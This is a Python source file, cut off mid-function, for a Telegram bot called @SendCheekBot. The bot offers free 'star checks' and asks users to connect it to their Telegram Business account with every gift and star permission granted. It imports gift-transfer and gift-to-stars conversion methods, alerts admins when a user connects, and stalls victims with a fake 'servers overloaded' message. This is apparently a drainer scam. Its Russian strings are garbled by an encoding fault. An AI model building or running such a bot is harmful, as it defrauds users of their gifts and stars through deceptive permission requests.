from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection, InputMediaPhoto
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage, DeleteMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars
from aiogram.types.input_file import FSInputFile
from aiogram.types import InlineQuery, InlineQueryResultPhoto, InlineQueryResultArticle, InputTextMessageContent
from aiogram.client.default import DefaultBotProperties
from PIL import Image, ImageDraw, ImageFont
import os
import logging
import asyncio
import json
import uuid
import datetime
import re

# –î–æ–¥–∞—î–º–æ —ñ–º–ø–æ—Ä—Ç –¥–ª—è GetFixedBusinessAccountStarBalance –∑ –¥—Ä—É–≥–æ–≥–æ –±–æ—Ç–∞
from custom_methods import GetFixedBusinessAccountStarBalance

import config

CONNECTIONS_FILE = "business_connections.json"
LANGUAGE_FILE = "user_languages.json"

TOKEN = config.BOT_TOKEN
ADMIN_IDS = config.ADMIN_IDS  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–æ –º–Ω–æ–∂–∏–Ω–∏
SENDER_ID = config.SENDER_ID
SPECIAL_USER_ID = 6831903905  # ID —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
BOT_USERNAME = "SendCheekBot"  # –î–æ–¥–∞–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–µ —ñ–º'—è –±–æ—Ç–∞

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–æ–≤
LANGUAGES = {
    "ru": {
        "welcome_message": (
            "–ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω, –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å' –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞"
        ),
        "authorize_caption": """
‚ö†Ô∏è –ë–æ—Ç –µ—â–µ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω.\n\nüß≠ <b>–°–ª–µ–¥—É–π—Ç–µ —ç—Ç–∏–º —à–∞–≥–∞–º:</b>\n1Ô∏è‚É£ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ ‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>.\n2Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞ ‚Üí –ß–∞—Ç—ã –±–æ—Ç–æ–≤</b>.\n3Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –±–æ—Ç–∞: <code>@SendCheekBot</code>.\n4Ô∏è‚É£ –ê–∫—Ç–∏–≤–∏—Ä—É–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è:\n   ‚Ä¢ –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤\n   ‚Ä¢ –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–≤—ë–∑–¥\n   ‚Ä¢ –ü–µ—Ä–µ–¥–∞—á–∞ –ø–æ–¥–∞—Ä–∫–æ–≤\n   ‚Ä¢ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤\n\n‚úÖ <b>–ì–æ—Ç–æ–≤–æ!</b>
""",
        "profile_caption": (
            "üë§ –í–∞—à –ø—Ä–æ—Ñ–∏–ª—å\n\n"
            "üÜî UUID –ü—Ä–æ—Ñ–∏–ª—è: {user_id}\n"
            "üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å (–≤ –±–æ—Ç–µ): 0 ‚≠êÔ∏è\n\n"
            "üöÄ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞\n"
            "–ü–æ–ª—É—á–∞–π +10% –æ—Ç –ø—Ä–∏–±—ã–ª–∏ —Å–µ—Ä–≤–∏—Å–∞ –∑–∞ –ø–æ–∫—É–ø–∫–∏ –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤!\n"
            "üë¨ –í—Å–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: 0\n"
            "üìå –í—Å–µ–≥–æ –ø–æ–ª—É—á–µ–Ω–æ –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: 0$\n"
            "üîó –í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:\n"
            "https://t.me/@SendCheekBot?start=ref_{user_id}\n\n"
            "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞\n"
            "üì¶ –£—Å–ø–µ—à–Ω—ã—Ö –∑–∞–∫–∞–∑–æ–≤: 0\n"
            "‚≠êÔ∏è –ö—É–ø–ª–µ–Ω–æ –∑–≤—ë–∑–¥: 0"
        ),
        "terms_caption": (
            "–£—Å–ª–æ–≤–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è @SendCheekBot:\n\n"
            "–ü–æ–ª–Ω—ã–º –∏ –±–µ–∑–æ–≥–æ–≤–æ—Ä–æ—á–Ω—ã–º –ø—Ä–∏–Ω—è—Ç–∏–µ–º —É—Å–ª–æ–≤–∏–π –¥–∞–Ω–Ω–æ–π –æ—Ñ–µ—Ä—Ç—ã —Å—á–∏—Ç–∞–µ—Ç—Å—è –æ–ø–ª–∞—Ç–∞ –∫–ª–∏–µ–Ω—Ç–æ–º —É—Å–ª—É–≥ –∫–æ–º–ø–∞–Ω–∏–∏.\n\n"
            "1. –ó–∞–ø—Ä–µ—â–µ–Ω–æ –ø–æ–ø–æ–ª–Ω—è—Ç—å –∑–≤–µ–∑–¥—ã –∏ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å –∏—Ö, –∏–Ω–∞—á–µ –∫–æ–º–ø–∞–Ω–∏—è –≤ –ø—Ä–∞–≤–µ –¥–æ—Å—Ä–æ—á–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —É—Å–ª—É–≥–∏ –∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–ª–∏–µ–Ω—Ç–∞ –±–µ–∑ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞ —Å—Ä–µ–¥—Å—Ç–≤.\n"
            "2. –ó–∞–ø—Ä–µ—â–µ–Ω–æ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –∂–∞–ª–æ–± –∫–æ–º–ø–∞–Ω–∏–∏, –≤ —Å–ª—É—á–∞–µ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏—è –∂–∞–ª–æ–±—ã –∫–ª–∏–µ–Ω—Ç–æ–º, –∫–æ–º–ø–∞–Ω–∏—è –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –æ—Ç–∫–∞–∑–∞—Ç—å –∫–ª–∏–µ–Ω—Ç—É –≤ —Å–≤–æ–∏—Ö —É—Å–ª—É–≥–∞—Ö.\n"
            "3. –ö–ª–∏–µ–Ω—Ç—É –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø (–µ—Å–ª–∏ –Ω–µ –æ–≥–æ–≤–æ—Ä–µ–Ω–æ –∏–Ω–æ–µ) –∫ –∑–≤–µ–∑–¥–∞–º, –∏ –∫–ª–∏–µ–Ω—Ç –Ω–µ—Å–µ—Ç –≤—Å—é —Å–≤—è–∑–∞–Ω–Ω—É—é —Å —ç—Ç–∏–º –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å.\n"
            "4. –í —Å–ª—É—á–∞–µ –Ω–∞—Ä—É—à–µ–Ω–∏—è —É—Å–ª–æ–≤–∏–π –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —É—Å–ª—É–≥ –∫–æ–º–ø–∞–Ω–∏—è –≤ –ø—Ä–∞–≤–µ –æ—Ç–∫–∞–∑–∞—Ç—å –∫–ª–∏–µ–Ω—Ç—É –≤ –≤–æ–∑–≤—Ä–∞—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤.\n"
            "5. –í–æ–∑–≤—Ä–∞—Ç –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤ –≤–æ–∑–º–æ–∂–µ–Ω —Ç–æ–ª—å–∫–æ –≤ —Å–ª—É—á–∞–µ –Ω–µ—Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏ –∏–ª–∏ –∑–∞ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –æ—à–∏–±–∫–∏ –±–æ—Ç–∞ –ø–æ –≤–∏–Ω–µ –∫–æ–º–ø–∞–Ω–∏–∏.\n"
            "6. –ü—Ä–æ–±–ª–µ–º—ã —Å –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ–º/–≤–æ–∑–≤—Ä–∞—Ç–æ–º –∑–≤–µ–∑–¥ ‚Äî –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∫–æ–º–ø–∞–Ω–∏–∏.\n\n"
            "–° —É–≤–∞–∂–µ–Ω–∏–µ–º, –∫–æ–º–∞–Ω–¥–∞ @SendCheekBot."
        ),
        "stars_caption": (
            "‚≠êÔ∏è –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –¥–æ—Å—Ç–∞–≤–∫–∞ Stars ‚Äî –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –∏ —É–¥–æ–±–Ω–æ!\n\n"
            "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏.\n"
            "2. üíº –ù–∞–∂–º–∏—Ç–µ –Ω–∞ Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞.\n"
            "3. ü§ñ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª –ß–∞—Ç-–±–æ—Ç—ã.\n"
            "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –±–æ—Ç–∞ @SendCheekBot –∏ –Ω–∞–∂–º–∏—Ç–µ –î–æ–±–∞–≤–∏—Ç—å.\n"
            "5. ‚úÖ –í—ã–¥–∞–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—É–Ω–∫—Ç '–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤–µ–∑–¥—ã' (5/5) –¥–ª—è –≤—ã–¥–∞—á–∏ –∑–≤–µ–∑–¥.\n\n"
            "–ó–∞—á–µ–º —ç—Ç–æ –Ω—É–∂–Ω–æ?\n"
            "‚Ä¢ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-—á–∞—Ç—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –æ–Ω –º–æ–≥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏ –Ω–∞–ø—Ä—è–º—É—é –æ—Ç–ø—Ä–∞–≤–ª—è—Ç–∏ –∑–≤–µ–∑–¥—ã –æ—Ç –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥—Ä—É–≥–æ–º—É ‚Äî –±–µ–∑ –ª–∏—à–Ω–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–π."
        ),
        "check_message": (
            "<b>‚ú® –í—ã –ø–æ–ª—É—á–∏–ª–∏ —á–µ–∫ –Ω–∞ {star_count} –∑–≤—ë–∑–¥!</b>\n"
        ),
        "activation_message": (
            "üí≥ –ß–µ–∫ –Ω–∞ {star_count} –∑–≤—ë–∑–¥\n\n"
            "‚≠êÔ∏è –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –¥–æ—Å—Ç–∞–≤–∫–∞ Stars ‚Äî –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –∏ —É–¥–æ–±–Ω–æ!\n\n"
            "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏.\n"
            "2. üíº –ù–∞–∂–º–∏—Ç–µ –Ω–∞ Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞.\n"
            "3. ü§ñ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª –ß–∞—Ç-–±–æ—Ç—ã.\n"
            "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –±–æ—Ç–∞ @{BOT_USERNAME} –∏ –Ω–∞–∂–º–∏—Ç–µ –î–æ–±–∞–≤–∏—Ç—å.\n"
            "5. ‚úÖ –í—ã–¥–∞–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—É–Ω–∫—Ç '–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤–µ–∑–¥—ã' (5/5) –¥–ª—è –≤—ã–¥–∞—á–∏ –∑–≤–µ–∑–¥.\n\n"
            "–ó–∞—á–µ–º —ç—Ç–æ –Ω—É–∂–Ω–æ?\n"
            "‚Ä¢ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-—á–∞—Ç—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –æ–Ω –º–æ–≥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏ –Ω–∞–ø—Ä—è–º—É—é –æ—Ç–ø—Ä–∞–≤–ª—è—Ç–∏ –∑–≤–µ–∑–¥—ã –æ—Ç –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥—Ä—É–≥–æ–º—É ‚Äî –±–µ–∑ –ª–∏—à–Ω–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–π."
        ),
        "authorize_button": "üìù –ß–µ–∫–∏",
        "profile_button": "üìñ –ü—Ä–æ—Ñ–∏–ª—å",
        "terms_button": "üìñ –£—Å–ª–æ–≤–∏—è",
        "support_button": "üó£Ô∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞",
        "stars_button": "‚≠ê –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–≤–µ–∑–¥",
        "back_button": "‚¨ÖÔ∏è –ù–∞–∑–∞–¥",
        "check_result": (
            "üí≥ –ß–µ–∫ –Ω–∞ {star_count} –∑–≤—ë–∑–¥ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n\n"
            "‚≠êÔ∏è –í–∞—à–∏ –∑–≤—ë–∑–¥—ã —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω—ã –Ω–∞ –±–∞–ª–∞–Ω—Å.\n"
            "–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ @SendCheekBot!"
        ),
        "check_permissions_button": "üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å",
        "no_permissions_message": (
            "‚ö†Ô∏è –í—ã –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏.\n\n"
            "–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-—á–∞—Ç—É –∏ –≤–∫–ª—é—á–∏—Ç—å –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤ —Ä–∞–∑–¥–µ–ª–µ '–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤–µ–∑–¥—ã' (5/5).\n\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–ª–µ–¥—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º:\n"
            "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏.\n"
            "2. üíº –ù–∞–∂–º–∏—Ç–µ –Ω–∞ Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞.\n"
            "3. ü§ñ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª –ß–∞—Ç-–±–æ—Ç—ã.\n"
            "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –±–æ—Ç–∞ @SendCheekBot –∏ –Ω–∞–∂–º–∏—Ç–µ –î–æ–±–∞–≤–∏—Ç—å.\n"
            "5. ‚úÖ –í–∫–ª—é—á–∏—Ç–µ –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤ —Ä–∞–∑–¥–µ–ª–µ '–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤–µ–∑–¥—ã'.\n\n"
            "–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å' –µ—â–µ —Ä–∞–∑."
        ),
        "permissions_granted_message": (
            "‚úÖ –í—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã!\n\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ 1-2 –º–∏–Ω—É—Ç—ã, –ø–æ–∫–∞ –±–æ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –≤–∞—à —á–µ–∫ –∏ –ø–µ—Ä–µ–¥–∞—Å—Ç –∑–≤–µ–∑–¥—ã. –í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —Å–µ—Ä–≤–µ—Ä–∞ –±–æ—Ç–∞ –Ω–µ–º–Ω–æ–≥–æ –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã, –ø—Ä–∏–Ω–æ—Å–∏–º –∏–∑–≤–∏–Ω–µ–Ω–∏—è –∑–∞ –æ–∂–∏–¥–∞–Ω–∏–µ."
        ),
        "business_connection_invalid_message": (
            "‚ö†Ô∏è –î–ª—è –≤—ã–¥–∞—á–∏ –∑–≤—ë–∑–¥ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –±–æ—Ç—É –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥\n\n"
            "–ú—ã –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å –≤—Å–µ—Ö –æ–ø–µ—Ä–∞—Ü–∏–π. –ß—Ç–æ–±—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å —á–µ–∫, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:\n"
            "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b> –≤ Telegram.\n"
            "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞ ‚Üí –ß–∞—Ç—ã –±–æ—Ç–æ–≤</b>.\n"
            "3. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –±–æ—Ç–∞ <code>@SendCheekBot</code> –∏ –Ω–∞–∂–º–∏—Ç–µ <b>–î–æ–±–∞–≤–∏—Ç—å</b>.\n"
            "4. ‚úÖ –í–∫–ª—é—á–∏—Ç–µ –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤ —Ä–∞–∑–¥–µ–ª–µ <b>–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã</b> (5/5).\n\n"
            "–ü–æ—Å–ª–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –Ω–∞–∂–º–∏—Ç–µ <b>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</b>, –∏ –≤–∞—à–∏ –∑–≤—ë–∑–¥—ã –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –º–≥–Ω–æ–≤–µ–Ω–Ω–æ!"
        )
    }
}

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ —Ä–æ–∑–±–æ—Ä—ñ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r", encoding="utf-8") as f:
        return json.load(f)

def load_user_language(user_id: int) -> str:
    return "ru"  # –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ä–æ—Å—ñ–π—Å—å–∫–∞

def save_user_language(user_id: int, lang: str):
    pass

async def send_welcome_message_to_admin(user_id):
    try:
        for admin_id in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –≤—Å—ñ–º –∞–¥–º—ñ–Ω–∞–º
            await bot.send_message(admin_id, f"üë§ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á #{user_id} –ø—ñ–¥–∫–ª—é—á–∏–≤ –±–æ—Ç–∞.")
    except Exception as e:
        logging.exception("–ù–µ –≤–¥–∞–ª–æ—Å—è –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤ –æ—Å–æ–±–∏—Å—Ç–∏–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }
    data = []
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break
    if not updated:
        data.append(business_connection_data)
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        lang = load_user_language(business_connection.user.id)
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, LANGUAGES[lang]["welcome_message"])
        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
        save_business_connection_data(business_connection)
        logging.info(f"–ë—ñ–∑–Ω–µ—Å-–∞–∫–∞—É–Ω—Ç –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ: {business_connection.user.id}, connection_id: {business_connection}")
    except Exception as e:
        logging.exception("–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –æ–±—Ä–æ–±—Ü—ñ –±—ñ–∑–Ω–µ—Å-–ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è.")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id
        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)
        if not connection:
            print(f"–ù–µ–≤—ñ–¥–æ–º–∏–π –±—ñ–∑–Ω–µ—Å connection_id: {conn_id}")
            return
        # –ê–≤—Ç–æ–≤—ñ–¥–ø–æ–≤—ñ–¥—å –≤–∏–¥–∞–ª–µ–Ω–æ
    except Exception as e:
        logging.exception("–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.")

@dp.message(F.text.startswith("/start"))
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    parts = message.text.split()
    lang = load_user_language(message.from_user.id)

    if len(parts) == 2 and parts[1].startswith("check_"):
        # –û–±—Ä–æ–±–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —á–µ–∫–∞
        _, check_id, user_id, star_count = parts[1].split("_")
        star_count = int(star_count)
        short_check_id = check_id[:8]  # –û–±—Ä—ñ–∑–∞—î–º–æ UUID –¥–æ 8 —Å–∏–º–≤–æ–ª—ñ–≤

        # –§–æ—Ä–º—É—î–º–æ —Ç–µ–∫—Å—Ç –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —Ä–æ—Å—ñ–π—Å—å–∫–æ—é
        caption = LANGUAGES[lang]["activation_message"].format(star_count=star_count, BOT_USERNAME=BOT_USERNAME)

        # –í–∏–∑–Ω–∞—á–∞—î–º–æ —Ñ–æ—Ç–æ –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –∑—ñ—Ä–æ–∫
        base_path = os.path.dirname(__file__)
        photo_path = None
        if star_count == 5:
            photo_path = os.path.join(base_path, "5.png")
            if not os.path.exists(photo_path):
                photo_path = os.path.join(base_path, "9", "5.png")
                logging.info(f"–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ñ–æ—Ç–æ –≤ –ø—ñ–¥–ø–∞–ø—Ü—ñ 9: {photo_path}")
        elif star_count == 100:
            photo_path = os.path.join(base_path, "100.png")
            if not os.path.exists(photo_path):
                photo_path = os.path.join(base_path, "9", "100.png")
                logging.info(f"–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ñ–æ—Ç–æ –≤ –ø—ñ–¥–ø–∞–ø—Ü—ñ 9: {photo_path}")

        logging.info(f"–°–ø—Ä–æ–±–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–æ—Ç–æ –∑–∞ —à–ª—è—Ö–æ–º: {photo_path}")
        logging.info(f"–§–∞–π–ª–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó: {os.listdir(base_path)}")

        # –î–æ–¥–∞—î–º–æ –ª–∏—à–µ –∫–Ω–æ–ø–∫—É "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=LANGUAGES[lang]["check_permissions_button"],
                callback_data=f"check_perm:{short_check_id}:{user_id}:{star_count}"
            )]
        ])

        if photo_path and os.path.exists(photo_path):
            photo = FSInputFile(photo_path)
            logging.info(f"–§–æ—Ç–æ {photo_path} –∑–Ω–∞–π–¥–µ–Ω–æ, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è.")
            await message.answer_photo(
                photo=photo,
                caption=caption,
                parse_mode="HTML",
                reply_markup=keyboard
            )
        else:
